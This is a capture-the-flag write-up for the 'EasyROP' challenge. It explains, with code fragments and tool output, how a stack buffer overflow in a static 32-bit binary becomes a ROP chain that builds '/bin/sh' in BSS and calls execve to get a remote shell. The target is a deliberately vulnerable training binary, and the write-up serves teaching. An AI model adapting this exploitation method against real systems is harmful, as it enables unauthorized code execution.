# AND!XOR Badge Challenge

This challenge was written by [@aagallag](https://twitter.com/aagallag) and was shared with some local PDX hacker groups by [@AndnPDXor](https://twitter.com/AndnPDXor). The first person to hack it was rewarded with a limited edition DEFCON 28: SAFE MODE AND!XOR badge! #mattdamon

## The Binary

The binary ([bin](EasyROP), [src](EasyROP.c)), is pretty simple, and has an obvious buffer overflow via `gets()` and `strcpy()`:

```c
void function(char *str)
{
   char buffer[16];
   strcpy(buffer,str);
}

void main()
{
  char large_string[256];
  gets(large_string);

  function(large_string);
  printf("Nope. String is %s\n", large_string);
}
```

As the name implies, NX is enabled so we need to build a ROP chain to exploit this:

```
$ checksec EasyROP
[*] '/home/zander/ctf/badge/EasyROP'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

## The Exploit

The easiest way to exploit this is to call `system("/bin/sh")`. Unfortunately, the program is static and doesn't call `system()`, so the function isn't available:

```
$ objdump -x EasyROP | grep system
080ce3cc l     O .rodata        00000010 system_dirs_len
080ce3e0 l     O .rodata        0000003e system_dirs
$ file EasyROP
EasyROP: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=0354e0c06c00b1cf1a64ac323ad924090451136d, not stripped
```

However, there is a syscall gadget available so we can build a ROP chain to do `execve("/bin/sh", 0, 0)`:

```
$ ROPgadget --binary EasyROP | grep ": int 0x80"      
0x0806d685 : int 0x80
```

The string `"/bin/sh"` isn't present in the binary, so it needs to be built somehow:

```
$ strings EasyROP | grep "/bin/sh"
$
```

This can be done using `strcpy()` and assemble it using other strings in the binary. A good target for building the string is the BSS section, because it has read/write permissions. I wrote this to the middle of the section that was just null bytes, at `0x80eb001`.

I used the `search` command in pwndbg to find `/`, `bin` and `sh` in the binary (manually truncated results):

```
pwndbg> search "/"
EasyROP         0x80d9a6c das     /* '/' */
pwndbg> search "bin"
EasyROP         0x80bc340 bound  ebp, qword ptr [ecx + 0x6e] /* 'binary' */
pwndbg> search "sh"
EasyROP         0x80bf17d jae    0x80bf1e7 /* 'sh' */
```

Below is a snippet from my exploit that builds the string. The `pop2_ret` variable is a pointer to a pop pop ret gadget that will allow us to chain ROP gadgets together (for a primer on ROP, please review [these slides](https://cand-f18.unexploitable.systems/l/lab05/W5L1.pdf) from Dr. Yeongjin Jang's Cyber Attacks & Defenses class at Oregon State)

```py
# strcpy
# 0x80d9a6c = /
# 0x80bc340 = bin
# 0x80bf17d = sh
s_slash = p32(0x80d9a6c)
s_bin = p32(0x80bc340)
s_sh = p32(0x80bf17d)

# write str to bss (no null byte)
s_binsh = 0x80eb001

strcpy = p32(elf.symbols['__strcpy_sse2'])

payload += strcpy
payload += pop2_ret
payload += p32(s_binsh)
payload += s_slash

payload += strcpy
payload += pop2_ret
payload += p32(s_binsh+1)
payload += s_bin

payload += strcpy
payload += pop2_ret
payload += p32(s_binsh+4)
payload += s_slash

payload += strcpy
payload += pop2_ret
payload += p32(s_binsh+5)
payload += s_sh
```

Here's what the above chain looks like in C

```c
// s_binsh = ""

strcpy(s_binsh, s_slash);

// s_binsh = "/"

strcpy(s_binsh+1, s_bin);

// s_binsh = "/binary"

strcpy(s_binsh+4, s_slash);

// s_binsh = "/bin/"

strcpy(s_binsh+5, s_sh);

// s_binsh = "/bin/sh"
```

Now that we have `"/bin/sh"`, we can prepare our syscall. To make the `execve("/bin/sh", 0, 0)` syscall, we need to set the following registers:

* `eax`: Syscall number - `0xb`
* `ebx`: Program string - `"/bin/sh"`
* `ecx`: argv array - `NULL`
* `edx`: envp array - `NULL`

In order to zero out ecx and edx, I used `xor` gadgets to avoid null bytes (although this ended up not being an issue). These gadgets worked well:

```
0x080497e3 : xor ecx, ecx ; pop ebx ; mov eax, ecx ; pop esi ; pop edi ; pop ebp ; ret
0x08072180 : xor edx, edx ; mov eax, edx ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc
```

The `xor ecx, ecx` gadget also allowed me to control ebx, so that took care of the program string. I also needed gadgets to control `eax` and to trigger the syscall. I already showed the syscall gadget earlier, and the `eax` gadget just does `pop eax ; ret`.

With that, I was able to build the full syscall:

```py
# execve("/bin/sh", 0, 0)
# eax = 0xb
# ebx = "/bin/sh"
# ecx = 0
# edx = 0

payload += xor_edx_stuff
payload += 4 * nop

payload += xor_ecx_stuff
payload += p32(s_binsh) # ebx
payload += 3 * b"bbbb"

payload += xor_eax
payload += pop_eax
payload += p32(0xb)

payload += syscall
```

And with that, a shell is born!

```
 ./exploit.py remote
[+] Opening connection to xxxxxxx on port 1337: Done
[*] '/home/zander/ctf/badge/EasyROP'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] Loaded cached gadgets for './EasyROP'
[*] wuddup
[*] Switching to interactive mode
$ id
uid=1000(easyrop) gid=1000(easyrop) groups=1000(easyrop)
```
